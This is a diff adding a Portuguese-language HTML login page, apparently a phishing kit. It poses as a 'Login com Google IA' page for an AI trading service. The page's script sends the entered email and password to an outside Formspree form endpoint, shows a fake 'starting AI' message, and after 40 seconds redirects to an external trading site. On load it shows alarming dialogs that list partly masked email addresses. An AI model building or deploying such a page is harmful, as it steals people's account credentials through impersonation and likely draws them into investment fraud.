@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bem-vindo Trader</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message-container {
+            display: none;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .message-container p {
+            color: green;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Login com Google IA</h2>
+        <h5>Insira suas credenciais para começar</h5>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="senha" name="senha" placeholder="Senha" required>
+            </div>
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+
+    <div class="message-container" id="messageContainer">
+        <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
+    </div>
+      
+    <script>
+        
+               var resposta = confirm("Você quer continuar?");
+        if (resposta) {
+          alert(" Os acessos foram vínculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (and***ndr*12@gmail.com/and***201*@gmail.com/si***bra*024@gmail.com) ");
+            
+        } else {
+            alert("Você escolheu sair.");
+            window.location.replace("https://www.sairsistema/Trading.ia");
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
+            // Exibe a mensagem de espera
+            document.getElementById('messageContainer').style.display = 'block';
+
+            // Coleta os dados do formulário
+            const formData = new FormData(this);
+
+            // Envia os dados usando fetch
+            fetch('https://formspree.io/f/mnnnkgwe', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Após o envio, redireciona para a página desejada
+                setTimeout(function() {
+                    window.location.href = "https://tradeboosting.org/app/login.php"; 
+                }, 40000);
+            }).catch(error => {
+                console.error('Erro ao enviar o formulário:', error);
+            });
+        });
+        
+    </script>
+
+</body>
+</html>
